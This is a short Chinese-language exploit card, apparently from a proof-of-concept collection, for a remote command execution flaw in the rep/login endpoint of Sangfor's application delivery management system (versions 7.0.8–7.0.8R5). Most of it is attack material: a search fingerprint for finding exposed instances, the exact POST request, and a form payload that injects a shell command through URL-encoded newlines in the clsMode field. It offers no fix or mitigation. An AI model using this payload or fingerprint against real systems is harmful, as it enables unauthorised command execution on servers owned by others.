# 深信服应用交付管理系统rep_login远程命令执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="SANGFOR 深信服应用交付报表系统"`
- **请求**：`POST /rep/login HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-type: application/x-www-form-urlencoded`　`Content-Length: 118`

**请求体 / payload**
```
clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123
```

**其他**
- 深信服应用交付管理系统rep/login远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 深信服应用交付管理系统7.0.8-7.0.8R5